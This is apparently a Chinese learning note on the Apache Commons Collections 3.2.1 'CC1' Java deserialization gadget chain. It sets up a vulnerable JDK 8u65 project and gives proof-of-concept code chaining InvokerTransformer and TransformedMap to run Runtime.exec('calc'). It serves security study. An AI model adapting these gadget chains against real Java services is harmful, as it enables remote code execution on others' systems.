![[1280X1280.jpeg]]
主要学习找链子的部分
# Common-Collections 相关介绍

[Apache Commons](http://commons.apache.org/)是Apache软件基金会的项目，曾经隶属于`Jakarta`项目。`Commons`的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：`Proper`（是一些已发布的项目）、`Sandbox`（是一些正在开发的项目）和`Dormant`（是一些刚启动或者已经停止维护的项目）。

- 简单来说，Common-Collections 这个项目开发出来是为了给 Java 标准的 `Collections API` 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。

## 包结构介绍

- `org.apache.commons.collections` – CommonsCollections自定义的一组公用的接口和工具类
- `org.apache.commons.collections.bag` – 实现Bag接口的一组类
- `org.apache.commons.collections.bidimap` – 实现BidiMap系列接口的一组类
- `org.apache.commons.collections.buffer` – 实现Buffer接口的一组类
- `org.apache.commons.collections.collection` –实现java.util.Collection接口的一组类
- `org.apache.commons.collections.comparators`– 实现java.util.Comparator接口的一组类
- `org.apache.commons.collections.functors` –Commons Collections自定义的一组功能类
- `org.apache.commons.collections.iterators` – 实现java.util.Iterator接口的一组类
- `org.apache.commons.collections.keyvalue` – 实现集合和键/值映射相关的一组类
- `org.apache.commons.collections.list` – 实现java.util.List接口的一组类
- `org.apache.commons.collections.map` – 实现Map系列接口的一组类
- `org.apache.commons.collections.set` – 实现Set系列接口的一组类
# CC1链
## 环境搭建
创建项目时选择jdk8u65和maven，设置和项目结构中java版本要一致，都是java8
pom.xml:
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<project xmlns="http://maven.apache.org/POM/4.0.0"  
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">  
    <modelVersion>4.0.0</modelVersion>  
  
    <groupId>com.johnsmith</groupId>  
    <artifactId>CC1</artifactId>  
    <version>1.0-SNAPSHOT</version>  
  
    <properties>        <maven.compiler.source>1.8</maven.compiler.source>  
        <maven.compiler.target>1.8</maven.compiler.target>  
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>  
    </properties>    <!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  
    <dependencies>  
        <!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  
        <dependency>  
            <groupId>commons-collections</groupId>  
            <artifactId>commons-collections</artifactId>  
            <version>3.2.1</version>  
        </dependency>    </dependencies></project>
```
## 验证
尝试调用cc1链出口类InvokeTransform成功
![[Pasted image 20250829174350.png]]
```java
import org.apache.commons.collections.functors.InvokerTransformer;  
  
import java.lang.reflect.Method;  
  
public class InvokeTransformerTest {  
    public static void main(String[] args) {  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}  
                , new Object[]{"calc"});  
        invokerTransformer.transform(runtime);  
    }  
}
```
## 寻找利用链
### 1.找出口类
在commons-collections包里找到Transformer接口，ctrl+f12查找所有实现接口的类
![[Pasted image 20250829174915.png]]
在InvokeTransformer类里找到了一个反射调用任意类，可以作为出口类
![[Pasted image 20250829175238.png]]
由于反射的目的是反射任意类型的对象，所以这里用了所有类的父类Object
前面的有参构造函数是public,因此使用InvokeTransformer时无需进行反射
```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {  
    super();  
    iMethodName = methodName;  
    iParamTypes = paramTypes;  
    iArgs = args;  
}
```
### 2.寻找调用链
`Ctrl+Alt+Shift+F7`查找所有调用transform的类
![[Pasted image 20250829183537.png]]
找到TransformMap中的valueTransform.checkSetValue调用了transform方法，接着从TransformedMap构造函数里找到valueTransform
![[Pasted image 20250829184438.png]]
由于TransformMap构造函数是protected属性，所以还得找到调用构造函数的方法
![[Pasted image 20250829184947.png]]
找到decorate方法创建了TransformMap对象，到这一步TransformedMap->InvokeTransformer才算构造完整
poc:
```java
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
  
public class decorateCalc {  
    public static void main(String[] args) throws Exception{  
        Runtime runtime = Runtime.getRuntime();  
		InvokerTransformer invokerTransformer = new InvokerTransformer("exec"  
 , new Class[]{String.class}, new Object[]{"calc"});  
		HashMap<Object, Object> hashMap = new HashMap<>();  
		Map decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);  
		Class<TransformedMap> transformedMapClass = TransformedMap.class;  
		Method checkSetValueMethod = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);  
		checkSetValueMethod.setAccessible(true);  
		checkSetValueMethod.invoke(decorateMap, runtime);  
 }  
}
```
首先，利用链是TransformedMap.decorate()->TransformedMap()->TransFormedMap.valueTransform()->valueTransform.checkSetValue()->InvokeTransformer.transform()，为了调用入口方法decorate()，需要引入HashMap和Map
 ### 3.构造完整链
尝试寻找调用decorate方法的类，但是找不到下一步了（TransformedSortedMap虽然也调用了decorate，但是没有transform方法，除此以外就没有了）
![[Pasted image 20250829221808.png]]
find usages找到调用checkSetValue()的方法parent.checkSetValue(value)，在`AbstractInputCheckedMapDecorator` 类中的一个内部类 `MapEntry`
![[Pasted image 20250830182647.png]]
![[Pasted image 20250830182853.png]]
setValue() 实际上就是在 Map 中对一组 entry（键值对）进行 setValue() 操作。
所以，我们在进行 .decorate 方法调用，进行 Map 遍历的时候，就会走到 setValue() 当中，而 setValue() 就会调用 checkSetValue
改进一下poc:
```java
 import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.util.HashMap;  
import java.util.Map;  
  
public class SetValueTest01 {  
    public static void main(String[] args) {  
        Runtime runtime = Runtime.getRuntime();  
 InvokerTransformer invokerTransformer = new InvokerTransformer("exec"  
 , new Class[]{String.class}, new Object[]{"calc"});  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 hashMap.put("key", "value");  
 Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);  
 for (Map.Entry entry:decorateMap.entrySet()){  
            entry.setValue(runtime);  
 }  
    }  
}
```
